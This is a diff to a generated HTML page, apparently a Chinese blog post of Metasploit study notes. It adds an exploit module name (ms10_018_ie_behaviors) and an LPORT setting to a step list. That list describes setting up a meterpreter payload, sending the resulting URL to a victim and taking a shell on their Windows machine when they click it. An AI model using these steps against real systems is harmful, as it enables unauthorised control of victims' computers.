@@ -16,7 +16,7 @@
 <meta property="og:description" content="MSF学习MSF介绍全名The Metasploit Framework 即漏洞框架 ，自带攻击工具 MSF术语 exploit &amp;emsp;&amp;emsp;&amp;emsp;攻击行为 payloads&amp;emsp;&amp;emsp;&amp;emsp;攻击载荷即攻击代码 shellcode&amp;emsp;&amp;emsp;&amp;emsp;溢出代码即攻击载荷运行的攻击机器指令 module &amp;emsp;&amp;emsp;&amp;emsp;也就是软件">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2020-04-06T04:24:31.537Z">
-<meta property="article:modified_time" content="2020-04-07T04:15:22.359Z">
+<meta property="article:modified_time" content="2020-04-07T04:24:01.612Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
   
@@ -231,10 +231,11 @@
 <li>同上  </li>
 <li>同上  </li>
 <li>同上  </li>
-<li>同上  </li>
+<li>use exploit/windows/browser/ms10_018_ie_behaviors  </li>
 <li>set SRVHOST:表示设置反弹回来的服务器，即攻击成功后，获取权限后，将权限返回到哪个服务器，这里我们选择kali的ip地址  </li>
 <li>set PAYLOADS windows/meterpreter/bind_tcp  </li>
 <li>show options： 查看payloads的使用方法  </li>
+<li>set LPORT： 设置端口  </li>
 <li>run:  运行后出现url地址，复制，作为一个链接  </li>
 <li>当有计算机点击该链接时，kali后台就会返回successful  </li>
 <li>接下来就可以拿shell了，控制目标计算机</li>
